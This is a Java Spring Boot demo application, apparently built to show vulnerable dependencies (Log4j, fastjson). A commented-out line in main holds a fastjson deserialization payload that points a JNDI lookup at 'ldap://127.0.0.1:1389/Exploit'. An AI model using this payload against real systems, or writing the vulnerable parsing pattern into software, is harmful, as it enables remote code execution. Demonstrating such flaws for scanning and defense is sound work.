package com.example.jfrog.demo;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import com.alibaba.fastjson.JSON;


@RestController
@SpringBootApplication
public class DemoApplication {

	private static final Logger logger = LogManager.getLogger();

	@RequestMapping(value = "/helloTomcat")
	public String getHelloTomcat(){
		return "Hello Tomcat!";
	}

	@RequestMapping(value = "/helloJFrog")
	public String getHelloJFrog(){
		return "Hello JFrog China! How are you";
	}

	@GetMapping(value = "/userName/{name}")
	public String getUserName(@PathVariable String name){
		return "Hello" + name;
	}

	public static void main(String[] args) {
//        String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/Exploit\"}";
//        JSON jsonObject = JSON.parseObject(payload);
//		logger.info(jsonObject.toString());
//
//		SpringApplication.run(DemoApplication.class, args);
	}

}
